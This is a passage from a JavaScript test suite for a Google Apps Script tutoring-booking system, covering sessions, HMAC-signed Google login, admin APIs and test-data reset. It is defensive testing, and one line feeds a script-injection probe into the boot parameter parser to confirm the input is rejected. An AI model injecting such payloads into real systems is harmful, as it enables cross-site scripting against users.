  assert.strictEqual(c.mailsTo('admin.karn@gmail.com').length, n1, 'tắt ADMIN_LINK_LOGIN: không gửi link admin');
  assert.strictEqual(api.apiExchangeToken(linkFor(c, 'A01'), UA_WIN).reason, 'FORBIDDEN', 'link admin cũ cũng không vào được');
});

t('I43', 'Bộ nhớ đệm phiên: không đọc tab AUTH mỗi lần gọi; thoát, thoát mọi thiết bị có hiệu lực ngay; danh sách thiết bị đúng', () => {
  const c = mk(), { api, env } = c;
  const a = tokenFor(c, 'T001', UA_WIN), b = tokenFor(c, 'T001', UA_IOS);
  assert.ok(api.apiTutorHome(a).ok);
  // Lần sau: xoá thẳng tab AUTH trong Sheets giả lập; phiên vẫn chạy nhờ bộ nhớ đệm (chứng minh không đọc AUTH)
  const sh = env.state.spreadsheets.DB_STAGING_TEST.sheets.AUTH, saved = sh.values.map(r => r.slice());
  sh.values = [sh.values[0]];
  api.clearDbCache_();
  assert.ok(api.apiTutorHome(a).ok, 'dùng bộ nhớ đệm');
  sh.values = saved; api.clearDbCache_();
  const list = api.listSessions_('T001', api.sha256Hex_(a));
  assert.strictEqual(list.length, 2);
  assert.deepStrictEqual(list.map(x => x.current).sort(), [false, true]);
  assert.ok(list.some(x => x.device === 'Chrome · Windows') && list.some(x => x.device === 'Safari · iOS'));
  // Thoát 1 thiết bị: thiết bị đó hết hiệu lực ngay dù đang trong bộ nhớ đệm
  api.apiTutorHome(b);
  api.apiLogout(b);
  assert.strictEqual(api.apiTutorHome(b).reason, 'SESSION_INVALID');
  assert.ok(api.apiTutorHome(a).ok);
  // Thoát mọi thiết bị
  const d = tokenFor(c, 'T001', UA_IOS);
  api.apiTutorHome(d);
  assert.strictEqual(typeof api.apiLogoutAll, 'undefined', '16/10: cổng tutor không còn Thoát mọi thiết bị');
  assert.strictEqual(typeof api.apiMySessions, 'undefined', '16/10: cổng không còn danh sách thiết bị');
  const r = api.logoutAll_(api.userById_('T001'), EMAIL.T001);
  assert.ok(r.ok && r.count === 2, JSON.stringify(r));
  assert.strictEqual(api.apiTutorHome(a).reason, 'SESSION_INVALID');
  assert.strictEqual(api.apiTutorHome(d).reason, 'SESSION_INVALID');
  assert.ok(c.rows('ACTIVITY_LOG').some(l => l.action === 'LOGOUT_ALL' && l.entity_id === 'T001'));
  // Tài khoản bị DISABLED: phiên trong bộ nhớ đệm cũng bị chặn (USERS vẫn được kiểm mỗi lần)
  const e = tokenFor(c, 'S003'); api.apiStudentHome(e);
  api.withLock_(() => api.table_('USERS').update(api.userById_('S003'), { status: 'DISABLED' }));
  assert.strictEqual(api.apiStudentHome(e).reason, 'SESSION_INVALID');
});

t('I44', 'Dọn tab AUTH mỗi ngày từ 03:00: bỏ link và phiên hết hạn quá 7 ngày, giữ phiên còn hạn; chạy lại trong ngày không làm gì', () => {
  const c = mk(), { api } = c;
  const keep = tokenFor(c, 'S003');
  api.withLock_(() => {
    const t = api.table_('AUTH');
    t.insert({ token_hash: 'old1', user_id: 'S005', kind: 'SESSION', expires_at: new Date(2026, 8, 1), created_at: new Date(2026, 7, 1) });
    t.insert({ token_hash: 'old2', user_id: 'S005', kind: 'LINK', expires_at: new Date(2026, 9, 1), created_at: new Date(2026, 9, 1) });
    t.insert({ token_hash: 'recent', user_id: 'S005', kind: 'LINK', expires_at: new Date(2026, 9, 10), created_at: new Date(2026, 9, 10) });
  });
  const before = c.rows('AUTH').length;
  c.at('2026-10-13 02:10'); api.hourlyJob();
  assert.strictEqual(c.rows('AUTH').length, before, 'chưa tới 03:00');
  c.at('2026-10-13 03:10'); const r = api.hourlyJob();
  assert.strictEqual(r.authPurged, 2, JSON.stringify(r));
  const hashes = c.rows('AUTH').map(a => a.token_hash);
  assert.ok(hashes.indexOf('old1') === -1 && hashes.indexOf('old2') === -1 && hashes.indexOf('recent') !== -1);
  assert.ok(api.apiStudentHome(keep).ok, 'phiên còn hạn vẫn dùng được');
  c.at('2026-10-13 05:10'); assert.strictEqual(api.hourlyJob().authPurged, null, '1 lần mỗi ngày');
});

t('I45', 'Đăng nhập Google: chữ ký đúng thì vào; dùng lại (kể cả khi bộ đệm mất), quá 2 phút, sai chữ ký, sai vai trò, admin DISABLED bị chặn; chữ ký sai, đối số lạ không ghi Sheets, không lấy khoá, không khoá được chữ ký đúng', () => {
  const c = mk(), { api, env } = c;
  const secret = 'k'.repeat(64);
  env.state.props.GOOGLE_LOGIN_SECRET = secret;
  const ts = String(Date.now()), e = 'admin.karn@gmail.com', sig = gsig(secret, e, ts);
  const r = api.apiGoogleExchange(e, ts, sig, UA_WIN);
  assert.ok(r.ok && r.data.role === 'ADMIN', JSON.stringify(r));
  assert.ok(api.apiAdminHome(r.data.sessionToken).ok);
  assert.ok(c.rows('AUTH').some(a => a.kind === 'SESSION' && a.user_id === 'A01' && a.device === 'Chrome · Windows · Google'));
  assert.ok(c.mailsTo(e).some(m => /^Có đăng nhập mới/.test(m.subject) && /Chrome · Windows/.test(m.htmlBody) && /Google/.test(m.htmlBody)));
  assert.strictEqual(api.apiGoogleExchange(e, ts, sig, UA_WIN).reason, 'GLOGIN_USED', 'không dùng lại được');
  env.state.cache = {};   // Google xoá bộ đệm sớm: vẫn chặn dùng lại (lưu trong Script Properties)
  assert.strictEqual(api.apiGoogleExchange(e, ts, sig, UA_WIN).reason, 'GLOGIN_USED');
  const old = String(Date.now() - 150000);
  assert.strictEqual(api.apiGoogleExchange(e, old, gsig(secret, e, old), UA_WIN).reason, 'GLOGIN_EXPIRED', 'quá 2 phút');
  const t2 = String(Date.now() + 1);
  const den = api.apiGoogleExchange('s003@student.test', t2, gsig(secret, 'S003@student.test', t2), UA_WIN);
  assert.strictEqual(den.reason, 'GLOGIN_DENIED', 'học viên không dùng Google login');
  assert.ok(/s003@student\.test.*chưa được cấp quyền/.test(den.message) && /link email/.test(den.message), 'câu báo chỉ cách làm tiếp: ' + den.message);
  const t3 = String(Date.now() + 3);
  assert.strictEqual(api.apiGoogleExchange(EMAIL.T001, t3, gsig(secret, EMAIL.T001, t3), UA_WIN).reason, 'GLOGIN_DENIED', 'tutor chưa bật');
  cfgSet(c, 'GOOGLE_LOGIN_ROLES', 'ADMIN,TUTOR');
  const t4 = String(Date.now() + 7);
  assert.ok(api.apiGoogleExchange(EMAIL.T001, t4, gsig(secret, EMAIL.T001, t4), UA_WIN).ok);
  api.withLock_(() => api.table_('USERS').update(api.userById_('A01'), { status: 'DISABLED' }));
  const t5 = String(Date.now() + 9);
  assert.strictEqual(api.apiGoogleExchange(e, t5, gsig(secret, e, t5), UA_WIN).reason, 'GLOGIN_DENIED', 'admin DISABLED');
  // Chữ ký sai: không ghi dòng nào, không lấy khoá; quá 30 lần mỗi 10 phút thì tạm chặn mọi lần thử
  const logs0 = c.rows('ACTIVITY_LOG').length, locks0 = env.state.lockCalls;
  for (let i = 0; i < 30; i++) assert.strictEqual(api.apiGoogleExchange(e, String(Date.now()), 'A'.repeat(43), UA_WIN).reason, 'GLOGIN_INVALID');
  assert.strictEqual(c.rows('ACTIVITY_LOG').length, logs0, 'không ghi Sheets');
  assert.strictEqual(env.state.lockCalls, locks0, 'không lấy khoá');
  const t6 = String(Date.now() + 11);
  assert.ok(api.apiGoogleExchange(EMAIL.T001, t6, gsig(secret, EMAIL.T001, t6), UA_WIN).ok, 'người lạ dò sai nhiều lần không khoá được chữ ký đúng');
  // Đối số lạ (object) từ google.script.run: không lỗi máy chủ, không ghi dòng, không lấy khoá
  const l1 = env.state.lockCalls, n1 = c.rows('NOTIFICATIONS').length;
  ['apiGoogleExchange', 'apiExchangeToken', 'apiRequestLogin', 'apiLogout', 'apiStudentHome'].forEach(fn => {
    const out = api[fn]({ toString: null }, { toString: null }, { toString: null }, { toString: null });
    assert.ok(out && out.reason !== 'SERVER_ERROR', fn + ': ' + JSON.stringify(out));
  });
  assert.strictEqual(env.state.lockCalls, l1, 'không lấy khoá');
  assert.strictEqual(c.rows('NOTIFICATIONS').length, n1, 'không ghi thông báo lỗi');
  env.state.cache = {};
  delete env.state.props.GOOGLE_LOGIN_SECRET;
  const t7 = String(Date.now() + 13);
  assert.strictEqual(api.apiGoogleExchange(EMAIL.T001, t7, gsig(secret, EMAIL.T001, t7), UA_WIN).reason, 'GLOGIN_INVALID', 'chưa có khoá thì không ai vào được');
  assert.ok(/Bấm lại nút đăng nhập Google/.test(api.apiGoogleExchange(e, t7, 'x'.repeat(43), UA_WIN).message), 'câu báo riêng cho Google, không bảo xin link');
  // bootJson: chỉ nhận đúng dạng
  const ok = JSON.parse(api.bootJson_({ page: 'gauth', ge: e, gts: ts, gs: sig }));
  assert.deepStrictEqual(ok.glogin, { e, ts, sig });
  const bad = JSON.parse(api.bootJson_({ page: 'gauth', ge: '"><script>alert(1)</script>@x.y', gts: ts, gs: sig }));
  assert.strictEqual(bad.glogin, null);
});

t('I46', 'Tutor tự xem số buổi tháng này, tháng trước: mọi cột khớp báo cáo lương; kết quả buổi học ghi đúng mã phiên đã bấm', () => {
  const c = mk(), { api } = c;
  ['T002', 'T003', 'T004'].forEach(t => [13, 14, 15].forEach(d => ['19:00', '20:00', '21:00'].forEach(s2 => c.setSlot(t, K(d, 10), s2, 'CANCELLED'))));
  const plan = [['S003', 13, '19:00'], ['S005', 13, '20:00'], ['S007', 14, '19:00'], ['S003', 14, '21:00'], ['S005', 15, '19:00']];
  const res = plan.map(([sid, d, sl]) => c.book(sid, [[K(d, 10), sl]])[0]);
  res.forEach(r => assert.ok(r.ok && c.row('BOOKINGS', r.bookingId).tutor_id === 'T001', JSON.stringify(r)));
  c.at('2026-10-15 22:00');
  const tok = tokenFor(c, 'T001');
  const me = api.sha256Hex_(tok).substring(0, 12);
  assert.ok(api.apiTutorSubmitResult(tok, res[0].bookingId, 'COMPLETED').ok);
  assert.ok(api.apiTutorSubmitResult(tok, res[1].bookingId, 'STUDENT_ABSENT').ok);
  assert.ok(api.apiTutorSubmitResult(tok, res[2].bookingId, 'TECH_ISSUE').ok);
  assert.ok(api.apiTutorSubmitResult(tok, res[3].bookingId, 'TECH_ISSUE').ok);
  const atok = tokenFor(c, 'A01');
  api.adminPayrollOverride_(res[3].bookingId, 'admin.karn@gmail.com', true);
  // res[4] (14/10) chưa xác nhận: đang chờ
  const st = api.apiTutorStats(tok).data.months, rep = api.computeMonthReport_(2026, 10).tutors.T001, oct = st[0];
  assert.strictEqual(oct.month, '10/2026');
  assert.deepStrictEqual([oct.completed, oct.studentAbsent, oct.techPaid, oct.techUnpaid, oct.tutorAbsent, oct.payable], [rep.COMPLETED, rep.STUDENT_ABSENT, rep.TECH_PAID, rep.TECH_UNPAID, rep.TUTOR_ABSENT, rep.payable]);
  assert.deepStrictEqual([oct.completed, oct.studentAbsent, oct.techPaid, oct.techUnpaid, oct.payable, oct.toConfirm], [1, 1, 1, 1, 3, 1]);
  assert.strictEqual(st[1].month, '09/2026');
  const logs = c.rows('ACTIVITY_LOG').filter(l => l.action === 'SESSION_RESULT');
  assert.strictEqual(logs.length, 4);
  logs.forEach(l => assert.ok(String(l.detail).indexOf('"session":"' + me + '"') !== -1, 'ghi đúng mã phiên: ' + l.detail));
  assert.strictEqual(api.apiTutorStats(tokenFor(c, 'S003')).reason, 'FORBIDDEN');
  assert.ok(atok);
});

t('I47', 'API admin: chỉ phiên ADMIN gọi được; số việc cần xử lý, lọc thông báo theo người và theo mức, đánh dấu đã đọc (lô), danh sách và chi tiết tutor, học viên, buổi học', () => {
  const c = mk(), { api, env } = c;
  const [a] = c.book('S003', [[K(14, 10), '19:00']]);
  const stok = tokenFor(c, 'S003'), ttok = tokenFor(c, 'T001');
  assert.ok(api.apiStudentCancel(stok, a.bookingId).ok);
  const names = Object.keys(api).filter(k => /^apiAdmin/.test(k));
  assert.ok(names.length >= 10, names.join(','));
  names.forEach(n => {
    assert.strictEqual(api[n](stok, 'S003').reason, 'FORBIDDEN', n + ' cho học viên');
    assert.strictEqual(api[n](ttok, 'S003').reason, 'FORBIDDEN', n + ' cho tutor');
    assert.strictEqual(api[n]('', 'S003').reason, 'SESSION_INVALID', n + ' không đăng nhập');
  });
  const atok = tokenFor(c, 'A01');
  const pend0 = api.apiAdminHome(atok).data.counts.pendingRegistrations;
  assert.ok(api.submitRegistration_(c.form({ email: 'moi.dk@test.com' })).ok);
  assert.strictEqual(api.apiAdminHome(atok).data.counts.pendingRegistrations, pend0 + 1, 'đăng ký mới chờ duyệt được đếm');
  const h = api.apiAdminHome(atok).data;
  assert.ok(h.unread.WARNING >= 1 && h.feed.items.some(n => n.event === 'STUDENT_CANCELLED'));
  const mine = api.apiAdminNotifications(atok, { personId: 'S003' }).data.items;
  assert.ok(mine.length >= 1 && mine.every(n => String(n.studentId).split(',').indexOf('S003') !== -1 || String(n.tutorId).split(',').indexOf('S003') !== -1));
  const cancelled = mine.find(n => n.event === 'STUDENT_CANCELLED');
  assert.strictEqual(api.apiAdminMarkRead(atok, [cancelled.id]).data.count, 1);
  assert.ok(c.row('NOTIFICATIONS', cancelled.id).read === true || String(c.row('NOTIFICATIONS', cancelled.id).read).toUpperCase() === 'TRUE');
  assert.ok(!api.apiAdminNotifications(atok, { unread: true, personId: 'S003' }).data.items.some(n => n.id === cancelled.id));
  const p = api.apiAdminPeople(atok).data;
  assert.strictEqual(p.tutors.length, 4); assert.ok(p.students.length >= 8);
  const s3 = api.apiAdminPerson(atok, 'S003').data;
  assert.ok(s3.packages.length >= 1 && s3.history.some(x => x.id === a.bookingId && x.status === 'CANCELLED_STUDENT'));
  assert.ok(s3.sessions.length >= 1, 'admin thấy thiết bị của học viên');
  assert.ok(Array.isArray(api.apiAdminPerson(atok, 'T001').data.stats));
  assert.strictEqual(api.apiAdminPerson(atok, 'A01').reason, 'NOT_FOUND', 'không xem chi tiết admin khác qua đây');
  const bk = api.apiAdminBooking(atok, a.bookingId).data;
  assert.ok(bk.log.some(l => l.action === 'CANCELLED') && /#gid=BOOKINGS&range=A\d+/.test(bk.sheetLink));
  assert.ok(api.apiAdminLog(atok, { text: a.bookingId }).data.items.length >= 2);
  const [b2] = c.book('S005', [[K(15, 10), '19:00']]);
  assert.ok(api.apiStudentCancel(tokenFor(c, 'S005'), b2.bookingId).ok);
  assert.ok(api.apiAdminHome(atok).data.unread.WARNING >= 1, 'có cảnh báo chưa đọc mới');
  const lv = api.apiAdminNotifications(atok, { level: 'WARNING' }).data.items;
  assert.ok(lv.length >= 1 && lv.every(n => n.level === 'WARNING'), 'lọc theo mức');
  assert.ok(api.apiAdminNotifications(atok, { level: 'INFO' }).data.items.every(n => n.level === 'INFO'));
  // Nhiều thông báo chưa đọc: "Đã đọc hết" ghi một lần cả cột
  for (let i = 0; i < 25; i++) api.notify_('RESULT_COMPLETED', { message: 'thử ' + i });
  const w0 = env.state.writeCalls;
  const all = api.apiAdminMarkRead(atok, 'ALL');
  assert.ok(all.ok && all.data.count >= 26, JSON.stringify(all));
  assert.ok(env.state.writeCalls - w0 <= 6, 'ghi theo lô (một dòng một lần ghi sẽ là 26 lần trở lên): ' + (env.state.writeCalls - w0) + ' lần ghi');
  assert.ok(c.rows('NOTIFICATIONS').every(n => n.read === true || String(n.read).toUpperCase() === 'TRUE'));
  assert.strictEqual(api.apiAdminHome(atok).data.unread.WARNING, 0);
});

t('I48', 'Admin đặt thay: qua hạn đặt vẫn đặt được, chỉ định tutor; vẫn chặn 1 buổi/ngày, slot đã bắt đầu, tutor không mở; email như khi học viên tự đặt', () => {
  const c = mk('2026-10-13 16:00'), { api } = c;   // đã qua 15:00: học viên không đặt được cho ngày mai
  const stok = tokenFor(c, 'S003'), atok = tokenFor(c, 'A01');
  const self = api.apiStudentBook(stok, [{ date: K(14, 10), slot: '19:00' }]).data[0];
  assert.strictEqual(self.reason, 'DEADLINE');
  const slots = api.apiAdminSlots(atok, 'S003', K(14, 10), 2).data;
  const d14 = slots.find(d => d.date === K(14, 10)), s19 = d14.slots.find(s => s.slot === '19:00');
  assert.ok(s19.tutors.length >= 2 && s19.auto);
  const want = s19.tutors.find(t => t.id !== s19.auto).id;
  const n0 = c.mailsTo(EMAIL.S003).length;
  const r = api.apiAdminBook(atok, 'S003', [{ date: K(14, 10), slot: '19:00', tutorId: want }]).data[0];
  assert.ok(r.ok, JSON.stringify(r));
  assert.strictEqual(c.row('BOOKINGS', r.bookingId).tutor_id, want, 'đúng tutor admin chọn');
  assert.ok(c.mailsTo(EMAIL.S003).length > n0, 'học viên nhận email xác nhận');
  assert.ok(c.rows('NOTIFICATIONS').some(n => n.event === 'BOOKED' && /đặt thay/.test(n.message)));
  assert.strictEqual(api.apiAdminBook(atok, 'S003', [{ date: K(14, 10), slot: '20:00' }]).data[0].reason, 'ONE_PER_DAY');
  assert.strictEqual(api.apiAdminBook(atok, 'S003', [{ date: K(13, 10), slot: '08:00' }]).data[0].reason, 'DEADLINE', 'slot đã bắt đầu');
  assert.ok(c.mailsTo(api.userById_(want).email).some(m => /^New lesson/.test(m.subject)), 'tutor nhận email buổi mới');
  // Tutor chỉ định đang bận đúng giờ đó (vừa nhận buổi trên), slot của tutor đã BLOCKED, tutor không mở: đều bị chặn
  assert.strictEqual(api.apiAdminBook(atok, 'S005', [{ date: K(14, 10), slot: '19:00', tutorId: want }]).data[0].reason, 'NO_TUTOR', 'tutor đã có buổi giờ đó');
  const other = s19.tutors.find(t => t.id !== want).id;
  c.setSlot(other, K(14, 10), '19:00', 'BLOCKED');
  assert.strictEqual(api.apiAdminBook(atok, 'S005', [{ date: K(14, 10), slot: '19:00', tutorId: other }]).data[0].reason, 'NO_TUTOR', 'slot BLOCKED');
  c.setSlot('T003', K(15, 10), '19:00', 'CANCELLED');
  assert.strictEqual(api.apiAdminBook(atok, 'S005', [{ date: K(15, 10), slot: '19:00', tutorId: 'T003' }]).data[0].reason, 'NO_TUTOR', 'tutor không mở slot');
  assert.ok(!api.apiAdminSlots(atok, 'S005', K(14, 10), 1).data.some(d => d.slots.some(x => x.slot === '19:00' && x.tutors.some(t => t.id === other || t.id === want))), 'không liệt kê tutor bận hoặc bị khoá');
  assert.strictEqual(api.apiAdminSlots(atok, 'T001').reason, 'NOT_FOUND');
});

t('I49', 'Admin huỷ trên web: không giới hạn hạn huỷ; từ 15:00 hôm trước là Huỷ muộn, học viên bị trừ lượt (5M, BL46); có thông báo ADMIN_CANCELLED; buổi đã huỷ hoặc đã bắt đầu không huỷ', () => {
  const c = mk(), { api } = c;
  const [a] = c.book('S001', [[K(14, 10), '19:00']]);   // S001 gói Trial 2 buổi: thấy rõ số buổi còn lại
  assert.ok(a.ok, JSON.stringify(a));
  const left0 = c.summary('S001')[0].sessionsLeft;
  c.at('2026-10-14 10:00');
  const atok = tokenFor(c, 'A01');
  assert.strictEqual(api.apiStudentCancel(tokenFor(c, 'S001'), a.bookingId).reason, 'CANCEL_DEADLINE');
  const r = api.apiAdminCancel(atok, a.bookingId, 'Học viên ốm, báo qua Zalo');
  assert.ok(r.ok, JSON.stringify(r));
  const b = c.row('BOOKINGS', a.bookingId);
  // Chunk 5M: huỷ lúc 10:00 cho buổi cùng ngày (sau 15:00 hôm trước) là Huỷ muộn: tính như học viên xin huỷ muộn (câu 12).
  assert.strictEqual(b.status, 'CANCELLED_LATE'); assert.strictEqual(b.cancel_reason, 'Học viên ốm, báo qua Zalo');
  assert.strictEqual(c.summary('S001')[0].sessionsLeft, left0, 'huỷ muộn: không trả lại buổi');
  assert.ok(c.rows('NOTIFICATIONS').some(n => n.event === 'ADMIN_CANCELLED' && n.entity_id === a.bookingId));
  assert.strictEqual(api.apiAdminCancel(atok, a.bookingId, '').reason, 'INVALID_INPUT');
  const [p2] = c.book('S003', [[K(15, 10), '19:00']]);
  c.at('2026-10-15 19:10');
  assert.strictEqual(api.apiAdminCancel(atok, p2.bookingId, '').reason, 'INVALID_INPUT', 'buổi đã bắt đầu');
  assert.strictEqual(c.row('BOOKINGS', p2.bookingId).status, 'CONFIRMED');
  assert.strictEqual(api.apiAdminBooking(atok, p2.bookingId).data.canCancel, false);
});

t('I50', 'Xoá dữ liệu test: chặn khi ALLOW_DATA_RESET tắt hoặc gõ sai câu; mức 1 giữ tutor và admin, sao lưu trước, gỡ sự kiện tương lai không gửi thư, phiên hết hiệu lực ngay; mức 2 chỉ còn admin', () => {
  const c = mk(), { api, env } = c;
  const [a] = c.book('S003', [[K(14, 10), '19:00']]);
  const stok = tokenFor(c, 'S003'); api.apiStudentHome(stok);
  const ttok = tokenFor(c, 'T001'); api.apiTutorHome(ttok);   // phiên tutor đang nằm trong bộ đệm
  api.withLock_(() => api.table_('USERS').update(api.userById_('T001'), { phone: '+84901000001', contact_link: api.contactFormula_('+84901000001') }));
  cfgSet(c, 'ALLOW_DATA_RESET', 'FALSE');
  assert.ok(/ALLOW_DATA_RESET/.test(api.resetTestData_('KEEP_TUTORS', 'XOA DU LIEU STAGING MUC 1', 'admin.karn@gmail.com').error));
  cfgSet(c, 'ALLOW_DATA_RESET', 'TRUE');
  const files0 = Object.keys(env.state.drive.files).length;
  assert.ok(/không đúng/.test(api.resetTestData_('KEEP_TUTORS', 'xoa du lieu', 'x').error));
  assert.strictEqual(Object.keys(env.state.drive.files).length, files0, 'gõ sai: không sao lưu, không xoá');
  assert.strictEqual(c.rows('BOOKINGS').length >= 1, true);
  const removes0 = c.calls('remove').length;
  assert.ok(/không đúng/.test(api.resetTestData_('KEEP_TUTORS', 'XOA DU LIEU STAGING MUC 2', 'x').error), 'câu của mức khác không dùng được');
  const r = api.resetTestData_('KEEP_TUTORS', 'XOA DU LIEU STAGING MUC 1', 'admin.karn@gmail.com');
  assert.ok(r.ok, JSON.stringify(r));
  assert.ok(/TRUOC_KHI_XOA/.test(r.backup) && Object.keys(env.state.drive.files).length === files0 + 1, 'có bản sao lưu');
  assert.strictEqual(r.eventsRemoved, 1);
  const rm = c.calls('remove').slice(removes0);
  assert.ok(rm.length === 1 && rm[0].sendUpdates === 'none', JSON.stringify(rm));
  ['BOOKINGS', 'AVAILABILITY', 'STUDENT_PACKAGES', 'REGISTRATIONS', 'PAYMENTS', 'AUTH', 'NOTIFICATIONS', 'MAIL_LOG'].forEach(t => assert.strictEqual(c.rows(t).length, 0, t));
  const log = c.rows('ACTIVITY_LOG');
  assert.deepStrictEqual(log.map(l => l.action), ['DATA_RESET_STARTED', 'DATA_RESET'], 'nhật ký chỉ còn 2 dòng ghi việc xoá');
  const roles = c.rows('USERS').map(u => u.role);
  assert.ok(roles.indexOf('STUDENT') === -1 && roles.filter(x => x === 'TUTOR').length === 4 && roles.indexOf('ADMIN') !== -1);
  assert.strictEqual(api.apiStudentHome(stok).reason, 'SESSION_INVALID', 'phiên cũ hết hiệu lực ngay');
  assert.strictEqual(api.apiTutorHome(ttok).reason, 'SESSION_INVALID', 'phiên tutor (tài khoản còn giữ) cũng hết hiệu lực dù đang trong bộ đệm');
  const t1 = c.rows('USERS').find(u => u.user_id === 'T001');
  assert.ok(/^=HYPERLINK\(/.test(String(c.rawCell('USERS', t1._row, 'contact_link'))), 'công thức HYPERLINK của dòng được giữ không bị đổi thành chữ');
  assert.ok(c.rows('CONFIG').length > 10 && c.rows('PACKAGES').length > 0, 'cài đặt giữ nguyên');
  // Sau khi xoá, hệ thống chạy lại bình thường: mã mới bắt đầu lại
  assert.strictEqual(api.withLock_(() => api.nextId_('BOOKINGS')), 'BK000001');
  const r2 = api.resetTestData_('ADMINS_ONLY', 'XOA DU LIEU STAGING MUC 2', 'admin.karn@gmail.com');
  assert.ok(r2.ok && c.rows('USERS').every(u => u.role === 'ADMIN'));
  assert.ok(api.resetTestData_('ALL', 'XOA DU LIEU STAGING MUC 1', 'x').error);
});

t('I51', 'Admin vào Meet: thêm cả admin USERS đang hoạt động (co-founder), bỏ tài khoản chạy hệ thống (chủ sự kiện) và admin DISABLED', () => {
  const c = mk(), { api, env } = c;
  api.withLock_(() => api.table_('USERS').insert({ user_id: 'A02', role: 'ADMIN', email: 'backup@thaiput.vn', name: 'Dự phòng', status: 'DISABLED' }));
  cfgSet(c, 'ADMIN_EMAIL', 'booking@thaiput.vn');   // admin@ vừa là tài khoản chạy hệ thống vừa là ADMIN_EMAIL
  const [r] = c.book('S003', [[K(14, 10), '19:00']]);
  const ev = c.row('BOOKINGS', r.bookingId).event_id;
  const p = c.calls('patch').find(x => x.id === ev);
  const emails = p.attendees;
  assert.ok(emails.indexOf('admin.karn@gmail.com') !== -1, 'co-founder vào được Meet');
  assert.ok(emails.indexOf('booking@thaiput.vn') === -1, 'không thêm chủ sự kiện');
  assert.ok(emails.indexOf('backup@thaiput.vn') === -1, 'admin dự phòng DISABLED không được thêm');
  assert.strictEqual(p.sendUpdates, 'none');
  assert.ok(!env.state.mails.some(m => m.to.indexOf('admin.karn@gmail.com') !== -1 && /thaiput/i.test(m.subject) && /Xác nhận|confirmed/.test(m.subject)), 'admin USERS không nhận email hệ thống');
});

t('I52', 'Dự án phụ đăng nhập Google (dist_google_login) ký đúng định dạng mà dự án chính kiểm: mở link là vào; chưa cài khoá thì báo rõ, không có nút', () => {
  const fs = require('fs'), path = require('path');
  const src = fs.readFileSync(path.join(__dirname, '..', 'companion', 'GoogleLogin.gs'), 'utf8');
  const c = mk(), { api, env } = c, secret = 'z'.repeat(64);
  env.state.props.GOOGLE_LOGIN_SECRET = secret;
  const comp = load({ props: { GOOGLE_LOGIN_SECRET: secret, MAIN_URL: 'https://script.google.com/macros/s/MAIN/exec' }, activeUserEmail: 'Admin.Karn@gmail.com', source: src });
  const html = comp.api.doGet().getContent();
  const href = (html.match(/href="([^"]+)"/) || [])[1].replace(/&amp;/g, '&');
  assert.ok(/^https:\/\/script\.google\.com\/macros\/s\/MAIN\/exec\?page=gauth&ge=/.test(href), href);
  const q = new URL(href).searchParams;
  const boot = JSON.parse(api.bootJson_({ page: q.get('page'), ge: q.get('ge'), gts: q.get('gts'), gs: q.get('gs') }));
  assert.ok(boot.glogin, 'trang chính nhận tham số');
  const r = api.apiGoogleExchange(boot.glogin.e, boot.glogin.ts, boot.glogin.sig, UA_WIN);
  assert.ok(r.ok && r.data.role === 'ADMIN', JSON.stringify(r));
  const empty = load({ props: {}, activeUserEmail: 'admin.karn@gmail.com', source: src }).api.doGet().getContent();
  assert.ok(/Chưa cài đặt/.test(empty) && !/href=/.test(empty));
  const anon = load({ props: { GOOGLE_LOGIN_SECRET: secret, MAIN_URL: 'https://x/exec' }, source: src });
  anon.env.state.activeUserEmail = '';   // Google không trả email (chưa đăng nhập hoặc nhiều tài khoản)
  const page = anon.api.doGet().getContent();
  assert.ok(/Không đọc được email Google/.test(page) && !/href=/.test(page), 'không ký cho email trống');
});

t('I53', 'Menu Xoá dữ liệu test qua hộp thoại 2 bước: Huỷ ở bước nào cũng không xoá; nhập sai mức hoặc sai câu không xoá; đúng cả 2 bước mới xoá; người lạ không chạy được', () => {
  const c = mk(), { api, env } = c;
  cfgSet(c, 'ALLOW_DATA_RESET', 'TRUE');
  c.book('S003', [[K(14, 10), '19:00']]);
  const n0 = c.rows('BOOKINGS').length;
  env.state.uiScript = [{ button: 'CANCEL' }];
  api.menuResetTestData(); assert.strictEqual(c.rows('BOOKINGS').length, n0, 'huỷ ở bước 1');
  env.state.uiScript = [{ text: '3' }];
  api.menuResetTestData(); assert.strictEqual(c.rows('BOOKINGS').length, n0, 'mức sai');
  env.state.uiScript = [{ text: '1' }, { button: 'CANCEL' }];
  api.menuResetTestData(); assert.strictEqual(c.rows('BOOKINGS').length, n0, 'huỷ ở bước 2');
  env.state.uiScript = [{ text: '1' }, { text: 'XOA DU LIEU STAGING' }];
  api.menuResetTestData(); assert.strictEqual(c.rows('BOOKINGS').length, n0, 'câu xác nhận thiếu tên môi trường');
  assert.ok(env.state.uiLog.some(x => /Câu xác nhận không đúng/.test(x.title + x.msg)));
  assert.ok(/BOOKINGS: 1 dòng/.test(env.state.uiLog.find(x => x.kind === 'prompt').msg), 'bước 1 hiện số dòng sẽ xoá');
  env.state.uiScript = [{ text: '2' }, { text: 'XOA DU LIEU STAGING MUC 1' }];
  api.menuResetTestData(); assert.strictEqual(c.rows('BOOKINGS').length, n0, 'chọn mức 2 nhưng gõ câu mức 1: không xoá');
  assert.ok(/MỨC 2: xoá mọi học viên VÀ 4 tài khoản tutor/.test(env.state.uiLog.filter(x => x.kind === 'prompt').pop().msg), 'bước 2 nói rõ mức đã chọn');
  env.state.uiScript = [{ text: '1' }, { text: 'XOA DU LIEU STAGING MUC 1' }];
  api.menuResetTestData(); assert.strictEqual(c.rows('BOOKINGS').length, 0, 'đúng 2 bước thì xoá');
  assert.ok(c.rows('USERS').some(u => u.role === 'TUTOR'), 'mức 1 giữ tutor');
  env.state.activeUserEmail = 'nguoi.la@gmail.com';
  assert.throws(() => api.menuResetTestData(), /Không có quyền/);
});

t('I54', 'Tài khoản DISABLED: job mỗi giờ huỷ hẳn phiên, mở lại tài khoản không làm phiên cũ sống lại; admin thoát mọi thiết bị của một người trên web; phiên đọc AUTH ngay trước khi thoát không sống lại trong bộ đệm', () => {
  const c = mk(), { api, env } = c;
  const ttok = tokenFor(c, 'T002'); api.apiTutorHome(ttok);
  api.withLock_(() => api.table_('USERS').update(api.userById_('T002'), { status: 'DISABLED' }));
  c.at('2026-10-12 11:05'); const r = api.hourlyJob();
  assert.strictEqual(r.revoked, 1, JSON.stringify(r));
  api.withLock_(() => api.table_('USERS').update(api.userById_('T002'), { status: 'ACTIVE' }));
  assert.strictEqual(api.apiTutorHome(ttok).reason, 'SESSION_INVALID', 'mở lại tài khoản: phiên cũ vẫn chết');
  const atok = tokenFor(c, 'A01'), stok = tokenFor(c, 'S005');
  api.apiStudentHome(stok);
  const k = api.apiAdminLogoutUser(atok, 'S005');
